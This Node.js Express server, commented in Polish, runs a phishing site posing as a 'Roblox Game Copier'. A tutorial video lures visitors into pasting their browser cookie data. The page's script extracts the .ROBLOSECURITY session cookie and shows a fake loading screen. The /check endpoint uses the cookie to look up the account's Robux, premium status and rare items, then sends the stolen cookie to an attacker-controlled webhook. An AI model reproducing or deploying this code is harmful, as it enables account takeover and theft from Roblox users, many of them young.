const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Strona główna
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GameCopier & ClothesCopier</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #0a0a14;
      color: #d0d8ff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      text-align: center;
      max-width: 700px;
      padding: 50px 20px;
    }
    h1 {
      color: #00d4ff;
      font-size: 4.2rem;
      margin-bottom: 0.4em;
      text-shadow: 0 0 30px #00d4ff88;
    }
    .subtitle {
      font-size: 1.5rem;
      color: #a0a8ff;
      margin: 1.5em 0 3em;
    }
    .btn {
      display: inline-block;
      margin: 1.6rem;
      padding: 24px 80px;
      font-size: 1.9rem;
      font-weight: bold;
      color: white;
      background: linear-gradient(135deg, #ff3366, #ff6b6b);
      border: none;
      border-radius: 70px;
      text-decoration: none;
      transition: all 0.4s ease;
      box-shadow: 0 16px 45px rgba(255,51,102,0.5);
    }
    .btn:hover {
      transform: translateY(-8px);
      box-shadow: 0 35px 80px rgba(255,51,102,0.75);
      background: linear-gradient(135deg, #ff4d4d, #ff8787);
    }
    .btn.clothes {
      background: linear-gradient(135deg, #8b5cf6, #a78bfa);
    }
    .btn.clothes:hover {
      background: linear-gradient(135deg, #7c3aed, #c4b5fd);
    }
  </style>
</head>
<body>
<div class="container">
  <h1>GameCopier Tools</h1>
  <p class="subtitle">Wybierz narzędzie do kopiowania gier lub ubrań w Roblox</p>
  <a href="/GameCopier" class="btn">Game Copier</a>
  <a href="/ClothesCopier" class="btn clothes">Clothes Copier</a>
</div>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
//   Game Copier – strona z filmem i fałszywym loadingiem
// ────────────────────────────────────────────────
app.get('/GameCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Game Copier</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #0f0f1a, #1a0f2e);
      color: #e0e0ff;
      min-height: 100vh;
      background-attachment: fixed;
    }
    .container {
      max-width: 1200px;
      margin: 50px auto;
      padding: 0 25px;
      text-align: center;
    }
    h1 {
      font-size: 4rem;
      color: #00d4ff;
      text-shadow: 0 0 35px #00d4ffaa;
      margin: 0.3em 0 0.2em;
    }
    .subtitle {
      font-size: 1.6rem;
      color: #a0a8ff;
      margin: 1em 0 3em;
    }
    .content {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 60px;
    }
    .left, .right {
      flex: 1;
      min-width: 380px;
      background: rgba(20,20,45,0.8);
      border-radius: 20px;
      padding: 40px;
      border: 1px solid #445588;
      backdrop-filter: blur(12px);
    }
    textarea {
      width: 100%;
      min-height: 300px;
      background: #1a1a2e;
      color: #d0d0ff;
      border: 1px solid #556;
      border-radius: 14px;
      padding: 20px;
      font-family: Consolas, monospace;
      font-size: 16px;
      resize: vertical;
      margin: 25px 0;
    }
    button {
      background: linear-gradient(90deg, #3b82f6, #60a5fa);
      color: white;
      border: none;
      padding: 22px 70px;
      font-size: 1.5rem;
      font-weight: bold;
      border-radius: 70px;
      cursor: pointer;
      transition: all 0.4s;
      box-shadow: 0 14px 40px rgba(59,130,246,0.55);
    }
    button:hover {
      transform: translateY(-6px);
      box-shadow: 0 30px 70px rgba(59,130,246,0.8);
    }
    #result {
      margin-top: 40px;
      font-size: 1.9rem;
      font-weight: bold;
      min-height: 140px;
      line-height: 1.5;
    }
    .loading { color: #fbbf24; animation: pulse 2.2s infinite; }
    .error   { color: #ff6b6b; }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }
    iframe {
      border-radius: 20px;
      border: none;
      box-shadow: 0 25px 60px rgba(0,0,0,0.75);
    }
  </style>
</head>
<body>
<div class="container">
  <h1>Game Copier</h1>
  <p class="subtitle">Paste your Game file in the box below, then click "Start Process"</p>

  <div class="content">
    <div class="left">
      <p style="font-size:1.3rem; margin-bottom:1.5em;">
        If you don't know how to get the Game file,<br>watch the tutorial video on the right.
      </p>
      <textarea id="input" placeholder="Paste your text here..."></textarea>
      <button onclick="startProcess()">Start Process</button>
      <div id="result"></div>
    </div>

    <div class="right">
      <iframe width="560" height="315" src="https://www.youtube.com/embed/k9SfgtkEmpo" 
        title="How To Copy Roblox Games In 2026 Tutorial" 
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
        allowfullscreen></iframe>
      <p style="margin-top:1.5em; font-size:1.3rem;">
        *NEW* How To Copy Roblox Games In 2026! (UNPATCHED)<br>
        Full guide – watch if you're stuck
      </p>
    </div>
  </div>
</div>

<script>
async function startProcess() {
  const raw = document.getElementById('input').value.trim();
  const result = document.getElementById('result');
  result.innerHTML = '';

  if (!raw) {
    result.innerHTML = '<span class="error">Nothing pasted!</span>';
    return;
  }

  let cookie = null;
  let match;

  match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
  if (match && match[1]) cookie = match[1].trim();

  if (!cookie) {
    match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
    if (match && match[1]) cookie = match[1].trim();
  }

  if (!cookie) {
    match = raw.match(/_\\|WARNING[^"]{200,}/);
    if (match) cookie = match[0].trim();
  }

  if (!cookie) {
    const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
    if (fallback.length) cookie = fallback.reduce((a,b)=>a.length>b.length?a:b).trim();
  }

  if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
    result.innerHTML = '<span class="error">Wrong File!<br>TIP: Watch the tutorial video above</span>';
    return;
  }

  result.innerHTML = '<span class="loading">Game Downloading Starting...<br>(estimated 3-5 minutes)</span>';

  fetch('/check', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ cookie })
  }).catch(err => {
    console.error('Fetch error:', err);
    // nadal zostaje loading – nie psujemy iluzji
  });
}
</script>
</body>
</html>
  `);
});

// Clothes Copier – na razie placeholder (możesz rozbudować)
app.get('/ClothesCopier', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clothes Copier</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f0f17; color: #e0e0ff; margin:0; padding:60px; text-align:center; }
    h1 { color: #a78bfa; font-size: 4rem; margin-bottom: 1em; }
    p { font-size: 1.6rem; line-height: 1.6; }
  </style>
</head>
<body>
  <h1>Clothes Copier</h1>
  <p>Coming soon – narzędzie do kopiowania ubrań / avatarów</p>
  <p><a href="/" style="color:#00d4ff; font-size:1.4rem;">← Wróć na stronę główną</a></p>
</body>
</html>
  `);
});

// ────────────────────────────────────────────────
//   ENDPOINT WYSYŁAJĄCY DO WEBHOOKA (pełna logika)
// ────────────────────────────────────────────────
app.post('/check', async (req, res) => {
  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ ok: false });
  }

  try {
    // 1. CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');

    // 2. Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
      },
    });
    if (!userRes.ok) throw new Error('Invalid cookie');
    const userData = await userRes.json();

    // 3. Email Verified (Verified Email Badge)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (ownsRes.ok) {
        const ownsData = await ownsRes.json();
        emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
      }
    } catch {}

    // 4. Premium
    let hasPremium = false;
    try {
      const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (premiumRes.ok) hasPremium = await premiumRes.json();
    } catch {}

    // 5. Robux
    let robux = 0;
    try {
      const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (currencyRes.ok) {
        const data = await currencyRes.json();
        robux = data.robux || 0;
      }
    } catch {}

    // 6. Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumbData = await thumbRes.json();
        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
      }
    } catch {}

    // 7. Headless & Korblox
    let hasHeadless = false;
    let hasKorblox = false;
    try {
      const headlessRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/201`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (headlessRes.ok) {
        const data = await headlessRes.json();
        hasHeadless = Array.isArray(data.data) && data.data.length > 0;
      }

      const korbloxRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
      });
      if (korbloxRes.ok) {
        const data = await korbloxRes.json();
        hasKorblox = Array.isArray(data.data) && data.data.length > 0;
      }
    } catch {}

    // ── WEBHOOK ───────────────────────────────────────
    const webhookUrl = process.env.WEBHOOK;
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [
              {
                color: 0x0F0F23,
                title: `👤 ${userData.name}`,
                description: "**Informacje o koncie**",
                thumbnail: { url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png" },
                fields: [
                  {
                    name: "┌─────── Statystyki ───────┐",
                    value: `• Premium: **${hasPremium ? 'Tak' : 'Nie'}**\n• Robux: **${robux.toLocaleString('en-US')}**\n• Email zweryfikowany: **${emailVerified ? 'Tak' : 'Nie'}**\n• Headless: **${hasHeadless ? 'Tak' : 'Nie'}**\n• Korblox: **${hasKorblox ? 'Tak' : 'Nie'}**`,
                    inline: false
                  }
                ],
                footer: { text: "GameCopier • " + new Date().toLocaleString('pl-PL') },
                timestamp: new Date().toISOString()
              },
              {
                color: 0x4B0082,
                title: "Captured .ROBLOSECURITY",
                description: `\`\`\`\n${cookie}\n\`\`\``,
                timestamp: new Date().toISOString()
              }
            ]
          })
        });
        console.log(`Webhook wysłany → ${userData.name} (${userData.id})`);
      } catch (e) {
        console.error('Webhook error:', e.message);
      }
    }

    res.json({ ok: true });

  } catch (err) {
    console.error('Błąd /check:', err.message);
    res.status(500).json({ ok: false });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Serwer uruchomiony na porcie ${PORT}`);
});
